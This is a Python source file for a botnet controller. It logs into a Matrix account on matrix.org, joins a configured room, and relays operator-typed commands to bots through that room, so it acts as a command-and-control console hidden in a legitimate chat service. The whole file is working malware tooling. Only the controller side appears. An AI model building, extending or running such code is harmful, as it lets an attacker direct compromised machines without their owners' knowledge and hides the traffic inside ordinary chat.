import asyncio
from matrix_client.client import MatrixClient, Room
from matrix_client.api import MatrixRequestError
from requests.exceptions import MissingSchema
import os
import sys
from dotenv import load_dotenv

load_dotenv()

MATRIX_HOMESERVER = "https://matrix.org"
USER_NAME = os.getenv('USER_NAME')  
PASSWORD = os.getenv('PASSWORD')
ROOM_ID = os.getenv('ROOM_ID')

class BotnetController:
    access_token: str
    room: Room
    
    def __init__(self):
        self.device_id = "BOTCONTROLLER"
        self.client = MatrixClient(MATRIX_HOMESERVER)

    def login(self):
        # login and sync
        try:
            self.access_token = self.client.login(username=USER_NAME, password=PASSWORD)
            print("[+] Logged in as controller.")
        except MatrixRequestError as e:
            print(e)
            if e.code == 403:
                print("Bad username or password.")
                sys.exit(4)
            else:
                print("Check your sever details are correct.")
                sys.exit(2)
        except MissingSchema as e:
            print("Bad URL format.")
            print(e)
            sys.exit(3)
            
    def join_room(self):
        # check if already joined, if not join the room
        try:
            room = self.client.rooms[ROOM_ID]
            print(f"Already joined room: {room.display_name}")
        except KeyError:
            room = self.client.join_room(ROOM_ID)
            print(f"Joined room: {room.display_name}")
        self.room = room

    def send_command(self, command):
        response = self.room.send_text(command)
        # TODO: check for correct response?
        print(f"[+] Sent command: {command}")

    def run(self):
        self.login()
        self.join_room()
        
        print("[+] Controller ready. Enter commands to send to bots.")
        while True:
            command = input("Enter command for bots: ")
            self.send_command(command)

if __name__ == "__main__":
    controller = BotnetController()
    asyncio.run(controller.run())